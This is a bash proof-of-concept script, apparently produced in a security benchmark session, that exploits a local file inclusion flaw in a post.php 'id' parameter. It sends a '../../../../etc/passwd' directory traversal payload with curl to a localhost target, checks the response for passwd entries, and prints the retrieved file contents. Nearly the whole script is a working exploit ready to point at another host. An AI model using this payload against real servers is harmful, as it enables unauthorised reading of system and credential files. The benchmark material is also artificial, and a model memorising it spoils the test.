#!/bin/bash
# POC: Demonstrates Local File Inclusion (LFI) vulnerability via directory traversal in the 'id' parameter of post.php endpoint. Attempts to read /etc/passwd using ../ sequences to escape the intended posts directory.
# Target: ./repo
# Created: 2025-11-07T16:53:50.458Z
# Session: benchmark-XBEN-061-24-mhp3932p

# POC for Local File Inclusion (LFI) via Directory Traversal
# Target: post.php endpoint with 'id' parameter
# Vulnerability: Improper path sanitization allows reading arbitrary files

# Configuration
TARGET_URL="http://localhost:8080/post.php"
PAYLOAD="../../../../etc/passwd"

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Local File Inclusion (LFI) Vulnerability POC${NC}"
echo -e "${YELLOW}[*] Target: $TARGET_URL${NC}"
echo -e "${YELLOW}[*] Payload: id=$PAYLOAD${NC}"
echo ""

# Execute the exploit
echo -e "${YELLOW}[*] Sending request...${NC}"
RESPONSE=$(curl -s "$TARGET_URL?id=$PAYLOAD")

# Check if response contains passwd file content
if echo "$RESPONSE" | grep -q "root:x:0:0"; then
    echo -e "${GREEN}[+] SUCCESS: LFI Vulnerability Confirmed!${NC}"
    echo -e "${GREEN}[+] /etc/passwd file contents retrieved:${NC}"
    echo ""
    echo "$RESPONSE" | head -20
    echo ""
    echo -e "${GREEN}[+] Vulnerability Details:${NC}"
    echo -e "${GREEN}    - Directory traversal sequences (../) are not sanitized${NC}"
    echo -e "${GREEN}    - Application allows reading arbitrary files${NC}"
    echo -e "${GREEN}    - No path canonicalization or whitelisting${NC}"
    exit 0
else
    # Alternative check: look for common system user entries
    if echo "$RESPONSE" | grep -qE "(daemon|bin|www-data|mail|backup):x:[0-9]+:[0-9]+"; then
        echo -e "${GREEN}[+] SUCCESS: LFI Vulnerability Confirmed!${NC}"
        echo -e "${GREEN}[+] System file contents retrieved:${NC}"
        echo ""
        echo "$RESPONSE" | head -20
        echo ""
        echo -e "${GREEN}[+] Vulnerability Details:${NC}"
        echo -e "${GREEN}    - Directory traversal sequences (../) are not sanitized${NC}"
        echo -e "${GREEN}    - Application allows reading arbitrary files${NC}"
        echo -e "${GREEN}    - No path canonicalization or whitelisting${NC}"
        exit 0
    else
        echo -e "${RED}[-] FAILED: Could not retrieve /etc/passwd${NC}"
        echo -e "${RED}[-] Response received:${NC}"
        echo "$RESPONSE" | head -20
        exit 1
    fi
fi